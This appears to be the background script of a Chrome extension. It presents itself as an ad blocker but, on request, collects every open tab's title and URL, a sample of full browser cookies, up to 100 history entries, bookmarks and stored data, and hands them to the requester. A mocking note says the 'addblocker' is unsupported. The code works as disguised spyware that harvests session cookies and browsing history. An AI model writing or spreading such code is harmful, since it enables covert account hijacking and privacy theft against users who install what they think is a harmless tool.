chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === "GET_ALL_DATA") {
    getAllData(sendResponse);
    return true;
  }

  if (message.type === "SET_CONFIG") {
    chrome.storage.local.set({
      config: message.config
    });
    return true;
  }

  if (message.type === "GET_CONFIG") {
    chrome.storage.local.get("config", (data) => {
      sendResponse(data);
    });

  return true;
  }
});



async function getAllData(sendResponse) {
  try {
    const [tabs, cookies, historyItems, bookmarks, storageData] = await Promise.all([
      chrome.tabs.query({}),
      chrome.cookies.getAll({}),
      chrome.history.search({ text: "", maxResults: 100 }),
      chrome.bookmarks.getTree(),
      chrome.storage.local.get(null)
    ]);

    const data = {
      timestamp: new Date().toISOString(),
      tabs: tabs.map(t => ({ title: t.title, url: t.url })),
      cookiesCount: cookies.length,
      cookiesSample: cookies.slice(0, 8),
      history: historyItems.map(h => ({ title: h.title, url: h.url })),
      bookmarksSample: bookmarks[0]?.children?.slice(0, 5) || [],
      storage: storageData,
      note: "Thank you very much. This addblocker is not supported by your OS. Please install Linux hehe"
    };

    sendResponse({ data });
  } catch (err) {
    sendResponse({ error: err.message });
  }
}